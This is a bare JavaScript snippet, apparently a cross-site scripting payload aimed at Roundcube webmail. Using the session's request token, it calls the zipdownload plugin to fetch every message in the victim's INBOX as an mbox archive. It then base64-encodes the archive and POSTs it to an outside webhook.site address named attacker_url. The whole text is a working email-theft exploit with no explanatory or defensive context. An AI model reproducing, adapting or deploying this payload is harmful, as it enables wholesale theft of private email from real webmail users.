const attacker_url = 'https://webhook.site/f7e9dfc7-ae37-4f59-a704-4772106023fb';
const formData = new FormData();
    formData.append('_uid', '*');
    formData.append('_mbox', 'INBOX');
    formData.append('_mode', 'mbox'); 
    formData.append('_token', parent.rcmail.env.request_token);

    fetch('?_task=mail&_action=plugin.zipdownload.messages', {
        method: 'POST',
        body: formData
    })
    .then(response => response.blob())
    .then(blob => {

        const reader = new FileReader();
        reader.readAsDataURL(blob);
        reader.onloadend = () => {
            const base64data = reader.result;

            fetch(attacker_url, {
                method: 'POST',
                body: base64data,
                mode: 'no-cors'
            });
        };
    });
